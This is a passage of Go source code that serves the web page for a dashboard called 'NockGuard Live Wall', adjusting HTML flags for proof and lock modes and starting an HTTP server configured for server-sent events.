	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		data, _ := indexFS.ReadFile("index.html")
		if len(b.proofSigner) != 0 {
			data = bytes.Replace(data, []byte(`id="f-proof" hidden`), []byte(`id="f-proof"`), 1)
		}
		if b.lockDB != "" || b.demo {
			data = bytes.Replace(data, []byte(`data-lock="0"`), []byte(`data-lock="1"`), 1)
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		_, _ = w.Write(data)
	})

	fmt.Printf("NockGuard Live Wall → http://%s   (audit: %s, lock: %q, demo: %v, chain-verify: %v)\n",
		*addr, *auditPath, b.lockDB, *demoMode, v.enabled())
	srv := &http.Server{
		Addr:         *addr,
		Handler:      mux,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 0, // SSE requires streaming.
		IdleTimeout:  120 * time.Second,
	}
	log.Fatal(srv.ListenAndServe())
}
